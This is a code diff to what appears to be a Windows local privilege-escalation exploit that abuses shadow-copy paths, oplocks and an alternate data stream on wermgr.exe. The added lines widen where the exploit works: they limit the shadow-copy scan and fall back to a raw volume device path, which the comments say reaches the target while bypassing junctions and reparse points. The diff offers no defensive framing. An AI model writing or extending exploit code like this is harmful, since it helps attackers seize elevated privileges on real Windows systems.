@@ -77914,6 +77914,16 @@ scanagain:
 	}
 
 	if (!srchfound) {
+		// On Windows Server, VSS snapshots may never appear (System Restore disabled,
+		// no scheduled snapshots). Don't block forever — retry a few times then bail.
+		static int vss_scan_retries = 0;
+		vss_scan_retries++;
+		if (vss_scan_retries >= 100) {
+			printf("ShadowCopyFinder: No new VSS snapshot after %d scans. Giving up.\n", vss_scan_retries);
+			retval = ERROR_NOT_FOUND;
+			goto cleanup;
+		}
+		Sleep(100); // Brief pause between scans
 		restartscan = true;
 		goto scanagain;
 	}
@@ -78997,7 +79007,18 @@ int main()
 	CloseHandle(heicar);
 	HANDLE hvss = NULL;
 	wchar_t vsswinpath[MAX_PATH] = { 0 };
-	wsprintf(vsswinpath, L"%s\\%s\\%s\\wermgr.exe:WDFOO", vsspath, &workdir[3],verdirname);
+
+	// If no VSS snapshot found, fall back to using the system device path directly.
+	// The VSS snapshot provides an alternate path to the same volume that bypasses
+	// junctions. The system device path (\Device\HarddiskVolumeN) achieves the same
+	// effect — it's a direct NT path to the volume that doesn't go through reparse points.
+	if (wcslen(vsspath) == 0) {
+		printf("[DEBUG] No VSS snapshot found. Using system device path fallback: %ws\n", g_devicepath);
+		wsprintf(vsswinpath, L"%s\\%s\\%s\\wermgr.exe:WDFOO", g_devicepath, &workdir[3], verdirname);
+	} else {
+		wsprintf(vsswinpath, L"%s\\%s\\%s\\wermgr.exe:WDFOO", vsspath, &workdir[3], verdirname);
+	}
+	printf("[DEBUG] Oplock target path: %ws\n", vsswinpath);
 	UNICODE_STRING _vsswinpath = { 0 };
 	RtlInitUnicodeString(&_vsswinpath, vsswinpath);
 	OBJECT_ATTRIBUTES objattr2 = { 0 };
